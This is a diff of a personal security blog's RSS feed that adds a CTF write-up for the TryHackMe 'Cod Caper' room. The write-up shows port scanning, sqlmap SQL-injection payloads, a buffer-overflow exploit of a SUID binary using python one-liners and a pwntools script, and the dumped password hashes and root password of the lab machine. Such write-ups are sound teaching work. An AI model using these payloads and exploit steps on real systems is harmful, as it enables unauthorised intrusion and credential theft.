@@ -1,4 +1,141 @@
-<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>fr33s0ul</title><description>Cybersecurity, Technology, and CTFs</description><link>http://localhost:2368/</link><image><url>http://localhost:2368/favicon.png</url><title>fr33s0ul</title><link>http://localhost:2368/</link></image><generator>Ghost 3.13</generator><lastBuildDate>Sun, 12 Apr 2020 17:20:37 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>Jack-of-All-Trades TryHackMe | write-up</title><description>&lt;p&gt;Hello everyone, today's machine is so fun to break, I enjoyed every step I practised, Jack-of-All-Trades CTF challenge box was created for the Securi-Tay conference run on the 28th of February, 2020 by the &lt;strong&gt;&lt;a href="https://hacksoc.co.uk/"&gt;Hacksoc&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;Let's start with some enumeration!&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.37.180
+<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>fr33s0ul</title><description>Cybersecurity, Technology, and CTFs</description><link>http://localhost:2368/</link><image><url>http://localhost:2368/favicon.png</url><title>fr33s0ul</title><link>http://localhost:2368/</link></image><generator>Ghost 3.13</generator><lastBuildDate>Tue, 14 Apr 2020 19:08:40 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>thecodcaper CTF | write-up</title><description>&lt;p&gt;Hello everyone, today's CTF is so impressive, not rated yet but from my little experience I can tell there's no easy or hard challenge, it's all about how out-of-the-box can you think. but no worries this one does have hints and the techniques are provided with the questioner. anyways! hope&lt;/p&gt;</description><link>http://localhost:2368/thecodca/</link><guid isPermaLink="false">5e90424a5e61514e230adc77</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Tue, 14 Apr 2020 18:52:00 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/pgn.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/pgn.png" alt="thecodcaper CTF | write-up"&gt;&lt;p&gt;Hello everyone, today's CTF is so impressive, not rated yet but from my little experience I can tell there's no easy or hard challenge, it's all about how out-of-the-box can you think. but no worries this one does have hints and the techniques are provided with the questioner. anyways! hope you guys enjoy this write-up, Let's enumerate machine!&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/jVZmRHItLSlGE1SYBV" width="480" height="273" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/cbs-306-seal306-seal-team-jVZmRHItLSlGE1SYBV"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sV -sC 10.10.201.143
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 09:50 UTC
+Nmap scan report for ip-10-10-201-143.eu-west-1.compute.internal (10.10.201.143)
+Host is up (0.0018s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
+|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
+|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+MAC Address: 02:8C:7D:6E:AC:54 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
+root@kali:~# 
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# gobuster dir -u http://10.10.201.143/ -w /usr/share/dirb/wordlists/big.txt -x .php
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.201.143/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirb/wordlists/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2020/04/10 09:53:19 Starting gobuster
+===============================================================
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/administrator.php (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2020/04/10 09:53:22 Finished
+===============================================================
+root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-10.56.10.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-10.57.37.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;So what's happening is that we will try to do a SQL injection in the POST data, we saved the request from burp and passed it to sqlmap&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# sqlmap -r request.txt --dbs
+        ___
+       __H__                                                                        
+ ___ ___["]_____ ___ ___  {1.4#stable}                                              
+|_ -| . [)]     | .'| . |                                                           
+|___|_  [)]_|_|_|__,|  _|                                                           
+      |_|V...       |_|   http://sqlmap.org                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:02:28 /2020-04-10/
+
+[10:02:28] [INFO] parsing HTTP request from 'request.txt'
+[10:02:28] [INFO] resuming back-end DBMS 'mysql' 
+[10:02:28] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=admin' RLIKE (SELECT (CASE WHEN (7708=7708) THEN 0x61646d696e ELSE 0x28 END))-- MUAf&amp;amp;password=pass
+
+    Type: error-based
+    Title: MySQL &amp;gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=admin' OR (SELECT 1403 FROM(SELECT COUNT(*),CONCAT(0x71706a6271,(SELECT (ELT(1403=1403,1))),0x716b627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- staB&amp;amp;password=pass
+
+    Type: time-based blind
+    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 3219 FROM (SELECT(SLEEP(5)))CJGe)-- kkog&amp;amp;password=pass
+---
+[10:02:28] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL &amp;gt;= 5.0
+[10:02:28] [INFO] fetching database names
+[10:02:28] [INFO] used SQL query returns 5 entries
+[10:02:28] [INFO] resumed: 'information_schema'
+[10:02:28] [INFO] resumed: 'mysql'
+[10:02:28] [INFO] resumed: 'performance_schema'
+[10:02:28] [INFO] resumed: 'sys'
+[10:02:28] [INFO] resumed: 'users'
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+[*] users
+
+[10:02:28] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.201.143'                                                                          
+[10:02:28] [WARNING] you haven't updated sqlmap for more than 99 days!!!
+
+[*] ending @ 10:02:28 /2020-04-10/
+
+root@kali:~# 
+&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-11.03.59.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;and we logged in with the credentials we got from the SQL injection, but the fun doesn't end there, we have a command prompt interacting with user &lt;strong&gt;www-data&lt;/strong&gt;, we definitely can do something about it.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-11.08.08.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;after digging a little bit, I found the &lt;strong&gt;SSH&lt;/strong&gt; private key to the user in the machine, thought why not! let's enter from the front door.&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/EsmlrgWNx5v0Y" width="480" height="433" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/what-whatever-shrug-EsmlrgWNx5v0Y"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# vim id_rsa
+root@kali:~# locate ssh2john
+/usr/share/john/ssh2john.py
+root@kali:~# /usr/share/john/ssh2john.py id_rsa 
+id_rsa has no password!
+root@kali:~# 
+&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;Great! no password 👌&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;But the issue here, when I tried to ssh to the machine, didn't let me in, it kept asking for the password, the next thing I thought about is a &lt;strong&gt;REVERSE SHELL&lt;/strong&gt; from the command prompt!&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/yoJC2GnSClbPOkV0eA" width="480" height="401" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/excited-birthday-yeah-yoJC2GnSClbPOkV0eA"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;so I managed to make a simple one with &lt;strong&gt;echo&lt;/strong&gt; in the &lt;strong&gt;/tmp&lt;/strong&gt; file, I managed to run it, and get a reverse shell from the user &lt;strong&gt;www-data&lt;/strong&gt;&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-11.24.12.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;I then did some enumeration for files that are running as root for our user, to see if we can escalate. I used &lt;strong&gt;&lt;a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS"&gt;LinPEAS&lt;/a&gt;&lt;/strong&gt; which is the new version of &lt;strong&gt;LinEnum&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;we found an interesting file called &lt;strong&gt;root&lt;/strong&gt; in &lt;strong&gt;/opt/secret/&lt;/strong&gt; and as explained by the CTF maker,&lt;strong&gt;"&lt;/strong&gt; The SUID file we found seems to expect 32 characters of input, and then immediately exits. This seems to warrant further investigation. Luckily I was practicing binary exploitation back when I was using that PC, so I have tools preinstalled to examine. One of those tools is pwndbg, a plugin for GDB which allows you to better examine binary files.&lt;/p&gt;&lt;p&gt;Run &lt;code&gt;gdb /opt/secret/root&lt;/code&gt; and you should see a screen similar to this&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-12.25.44.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;This means that pwndbg has successfully been initialized. The next step is to test if anything happens when you send more then 32 characters. To do this type &lt;code&gt;r &amp;lt; &amp;lt;(cyclic 50)&lt;/code&gt;, that command runs the program and provides 50 characters worth of "cyclic" input.&lt;/p&gt;&lt;p&gt;Cyclic input goes like this: "aaaaaaaabaaacaaadaaaeaaaf" etc. Because it's in this "cyclic" format, it allows us to better understand the control we have over certain registers, for reasons you are about to see.&lt;/p&gt;&lt;p&gt;Once you run that command you should see something similar to this screen&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-12.26.02.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Now this is where some knowledge of assembly helps. It seems that in this case we're able to overwrite EIP, which is known as the instruction pointer. The instruction pointer tells the program which bit of memory to execute next, which in an ideal case would have the program run normally. However, since we're able to overwrite it, we can theoretically execute any part of the program at any time. Recall the shell function from the source code, if we can overwrite EIP to point to the shell function, we can cause it to execute. This is also where the benefits of cyclic input show themselves. Recall that cyclic input goes in 4 character/byte sequences, meaning we're able to calculate exactly how many characters we need to provide before we can overwrite EIP. Luckily cyclic provides this functionality with the -l flag, running cyclic -l {fault address} will tell us exactly how many characters we need to provide we can overwrite EIP.&lt;/p&gt;&lt;p&gt;Running &lt;code&gt;cyclic -l 0x6161616c&lt;/code&gt; outputs 44, meaning we can overwrite EIP once we provide 44 characters of input.&lt;br&gt;That's all we needed for pre-explotation!&lt;/p&gt;&lt;p&gt;Now the next step is to find out exactly where the shell function is in memory so we know what to set EIP to. GDB supports this as well with the disassemble command. Type disassemble shell, and this should pop up.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-12.26.18.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;What we're interested in is the hex memory addresses. So from what we know all we have to do is provide 44 characters, and then "0x080484cb" and the shell function should execute, let's try it!&lt;br&gt;Note: Modern CPU architectures are "little endian" meaning bytes are backwards. For example "0x080484cb" would become "cb840408" We can use python to do this, as it allows a nice way of converting.&lt;/p&gt;&lt;p&gt;Method 1 - Manual conversion:&lt;br&gt;&lt;code&gt;python -c 'print "A"*44 + "\xcb\x84\x04\x08"'&lt;/code&gt; will output the payload we want, but it requires manually converting to little endian&lt;/p&gt;&lt;p&gt;Method 2 - Struct:&lt;br&gt;&lt;code&gt;python -c 'import struct;print "A"*44 + struct.pack("&amp;lt;I",0x080484cb")'&lt;/code&gt;&lt;br&gt;It requires importing a module but struct.pack allows us to automatically convert memory to little endian. &lt;br&gt;We print 44 random characters(in this case A) and then our memory address in little endian, and shell should execute. This can be tested by piping the output in to the binary&lt;br&gt;&lt;code&gt;python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root&lt;/code&gt;&lt;br&gt;should provide you with this output.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;www-data@ubuntu:/opt/secret$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root    
+&amp;lt;$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root          
+root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18277:0:99999:7:::
+uuidd:*:18277:0:99999:7:::
+papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
+Illegal instruction
+www-data@ubuntu:/opt/secret$ su root
+su root
+Password: love2fish
+
+root@ubuntu:/opt/secret#id
+uid=0(root) gid=0(root) groups=0(root)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Pwntools is a python library dedicated to making everything we just did in the last task much simpler. However, since it is a library, it requires python knowledge to use to it's full potential, and as such everything in this task will be done using a python script.&lt;br&gt;We start off the script with:&lt;/p&gt;&lt;p&gt;&lt;code&gt;from pwn import *&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc = process('/opt/secret/root')&lt;/code&gt;&lt;/p&gt;&lt;p&gt;This imports all the utilities from the pwntools library so we can use them in our script, and then creates a process that we can interact with using pwntools functions.&lt;/p&gt;&lt;p&gt;We know that we need the memory address of the shell function, and pwntools provides a way to obtain that with ELF(). ELF allows us to get various memory addresses of important points in our binary, including the memory address of the shell function.&lt;br&gt;With the ELF addition our script becomes&lt;br&gt;&lt;code&gt;from pwn import *&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc = process('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;elf = ELF('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;shell_func = elf.symbols.shell&lt;/code&gt;&lt;br&gt;shell_func holds the memory address of our shell function. Now we need a way to form the payload, luckily pwntools has that to with fit().&lt;/p&gt;&lt;p&gt;fit allows us to form a payload by combining characters and our memory address. To send the payload we can use a method in our &lt;code&gt;proc&lt;/code&gt; variable, proc.sendline(), which just sends whatever data we want to the binary. Finally we can use proc.interactive(), to view the full output of the process.&lt;br&gt;With all that our final exploit script becomes&lt;br&gt;&lt;code&gt;from pwn import *&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc = process('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;elf = ELF('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;shell_func = elf.symbols.shell&lt;/code&gt;&lt;br&gt;&lt;code&gt;payload = fit({&lt;/code&gt;&lt;br&gt;&lt;code&gt;44: shell_func # this adds the value of shell_func after 44 characters&lt;/code&gt;&lt;br&gt;&lt;code&gt;})&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc.sendline(payload)&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc.interactive()&lt;/code&gt;&lt;br&gt;Save that to a .py file and run it, and you should get this output:&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-14-at-19.38.53.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Now that we have the password hashes, we can crack them and get the root password! Recall from the previous outputs that our root password hash is &lt;code&gt;$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.&lt;/code&gt;&lt;strong&gt;"&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Happy hacking!&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com/room/thecodcaper"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | The Cod Caper&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;A guided room taking you through infiltrating and exploiting a Linux system.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt="thecodcaper CTF | write-up"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme-images.s3.amazonaws.com/room-icons/282c55307eada4ad18a0b06e4d65ff34.jpeg" alt="thecodcaper CTF | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | Hacking Training&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;An online platform for learning and teaching cyber security, all through your browser.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt="thecodcaper CTF | write-up"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme.com/img/favicon.png" alt="thecodcaper CTF | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/O5GKT0UDGyQLu" width="480" height="271" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/penguins-O5GKT0UDGyQLu"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;</content:encoded></item><item><title>Jack-of-All-Trades TryHackMe | write-up</title><description>&lt;p&gt;Hello everyone, today's machine is so fun to break, I enjoyed every step I practised, Jack-of-All-Trades CTF challenge box was created for the Securi-Tay conference run on the 28th of February, 2020 by the &lt;strong&gt;&lt;a href="https://hacksoc.co.uk/"&gt;Hacksoc&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;Let's start with some enumeration!&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.37.180
 Starting&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/jack-of-all-trades-tryhackme-write-up/</link><guid isPermaLink="false">5e9314b5ee23ee27e3575c25</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Sun, 12 Apr 2020 16:51:08 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/jackinthebox.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/jackinthebox.jpg" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;p&gt;Hello everyone, today's machine is so fun to break, I enjoyed every step I practised, Jack-of-All-Trades CTF challenge box was created for the Securi-Tay conference run on the 28th of February, 2020 by the &lt;strong&gt;&lt;a href="https://hacksoc.co.uk/"&gt;Hacksoc&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;Let's start with some enumeration!&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.37.180
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-12 13:15 UTC
 Nmap scan report for ip-10-10-37-180.eu-west-1.compute.internal (10.10.37.180)
@@ -569,8 +706,8 @@ root&lt;/code&gt;&lt;/pre&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="htt
 		/*! This file is auto-generated */
 		!function(d,l){"use strict";var e=!1,o=!1;if(l.querySelector)if(d.addEventListener)e=!0;if(d.wp=d.wp||{},!d.wp.receiveEmbedMessage)if(d.wp.receiveEmbedMessage=function(e){var t=e.data;if(t)if(t.secret||t.message||t.value)if(!/[^a-zA-Z0-9]/.test(t.secret)){var r,a,i,s,n,o=l.querySelectorAll('iframe[data-secret="'+t.secret+'"]'),c=l.querySelectorAll('blockquote[data-secret="'+t.secret+'"]');for(r=0;r&lt;c.length;r++)c[r].style.display="none";for(r=0;r&lt;o.length;r++)if(a=o[r],e.source===a.contentWindow){if(a.removeAttribute("style"),"height"===t.message){if(1e3&lt;(i=parseInt(t.value,10)))i=1e3;else if(~~i&lt;200)i=200;a.height=i}if("link"===t.message)if(s=l.createElement("a"),n=l.createElement("a"),s.href=a.getAttribute("src"),n.href=t.value,n.host===s.host)if(l.activeElement===a)d.top.location.href=t.value}}},e)d.addEventListener("message",d.wp.receiveEmbedMessage,!1),l.addEventListener("DOMContentLoaded",t,!1),d.addEventListener("load",t,!1);function t(){if(!o){o=!0;var e,t,r,a,i=-1!==navigator.appVersion.indexOf("MSIE 10"),s=!!navigator.userAgent.match(/Trident.*rv:11\./),n=l.querySelectorAll("iframe.wp-embedded-content");for(t=0;t&lt;n.length;t++){if(!(r=n[t]).getAttribute("data-secret"))a=Math.random().toString(36).substr(2,10),r.src+="#?secret="+a,r.setAttribute("data-secret",a);if(i||s)(e=r.cloneNode(!0)).removeAttribute("security"),r.parentNode.replaceChild(e,r)}}}}(window,document);
 //--&gt;&lt;!]]&gt;
-&lt;/script&gt;&lt;iframe sandbox="allow-scripts" security="restricted" src="https://www.hackingarticles.in/lxd-privilege-escalation/embed/" width="600" height="338" title="&amp;#8220;Lxd Privilege Escalation&amp;#8221; &amp;#8212; Hacking Articles" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"&gt;&lt;/iframe&gt;&lt;/figure&gt;</content:encoded></item><item><title>Kenobi | CTF write-up</title><description>&lt;p&gt;This today's CTF we will cover a Kenobi made by www.tryhackme.com the theme of the machine is star-wars  ...&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/9gISqB3tncMmY" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/cat-star-wars-9gISqB3tncMmY"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Let's enumerate this machine and see what we're dealing with&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.68.87
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:36&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/kenobi-ctf-write-up/</link><guid isPermaLink="false">5e8c661f75832c27370ae6ca</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Tue, 07 Apr 2020 11:40:35 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/Animated-GIF-downsized_large.gif" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/Animated-GIF-downsized_large.gif" alt="Kenobi | CTF write-up"&gt;&lt;p&gt;This today's CTF we will cover a Kenobi made by www.tryhackme.com the theme of the machine is star-wars  ...&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/9gISqB3tncMmY" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/cat-star-wars-9gISqB3tncMmY"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Let's enumerate this machine and see what we're dealing with&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.68.87
+&lt;/script&gt;&lt;iframe sandbox="allow-scripts" security="restricted" src="https://www.hackingarticles.in/lxd-privilege-escalation/embed/" width="600" height="338" title="&amp;#8220;Lxd Privilege Escalation&amp;#8221; &amp;#8212; Hacking Articles" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"&gt;&lt;/iframe&gt;&lt;/figure&gt;</content:encoded></item><item><title>Kenobi | CTF write-up</title><description>&lt;p&gt;today's CTF we will cover a Kenobi made by www.tryhackme.com the theme of the machine is star-wars  ...&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/9gISqB3tncMmY" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/cat-star-wars-9gISqB3tncMmY"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Let's enumerate this machine and see what we're dealing with&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.68.87
